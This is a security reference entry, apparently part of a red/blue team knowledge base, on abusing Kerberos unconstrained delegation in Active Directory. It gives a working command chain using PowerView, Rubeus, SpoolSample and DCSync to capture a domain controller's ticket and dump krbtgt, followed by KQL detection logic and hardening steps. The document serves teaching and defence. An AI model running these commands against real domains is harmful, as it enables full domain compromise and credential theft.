# [CA-KERB-005]: Unconstrained Delegation Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-005 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Servers with "Trust this computer for delegation to any service" (Unconstrained Delegation) store a copy of the TGT of *any* user that authenticates to them in memory. If an attacker compromises such a server, they can wait for a Domain Admin (or the DC computer account) to connect, dump their TGT, and impersonate them.
- **Attack Surface:** Computers with `TRUSTED_FOR_DELEGATION` flag.
- **Business Impact:** **Domain Compromise**. Often used with the "Printer Bug" to force a DC to connect to the compromised server.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Local Admin on the Unconstrained Server.
- **Vulnerable Config:** `userAccountControl` band `0x80000`.
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [SpoolSample](https://github.com/leechristensen/SpoolSample) (Printer Bug)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Discovery**
Find unconstrained servers.
```powershell
Get-DomainComputer -Unconstrained
```

**Step 2: Monitor & Harvest**
Run Rubeus to listen for incoming tickets.
```powershell
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

**Step 3: Coerce Authentication (Printer Bug)**
Force the DC to authenticate to the compromised server.
```cmd
.\SpoolSample.exe DC01.target.local COMPROMISED.target.local
```

**Step 4: Pass-the-Ticket**
Rubeus captures the TGT. Inject it to DCSync.
```powershell
.\Rubeus.exe ptt /ticket:BASE64...
lsadump::dcsync /domain:target.local /user:krbtgt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Service Name = `krbtgt`, Target Name = Compromised Host (rare for machine to req TGT for another machine). |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4769
| where ServiceName == "krbtgt"
| where TargetUserName endswith "$" // Machine account requesting TGT
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Config:** Audit and remove Unconstrained Delegation. Use **Constrained Delegation** or **RBCD**.
*   **Protected Users:** Add sensitive accounts to "Protected Users" group (prevents delegation).
*   **Account Option:** Check "Account is sensitive and cannot be delegated".

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001]
> **Next Logical Step:** [CA-DUMP-002]
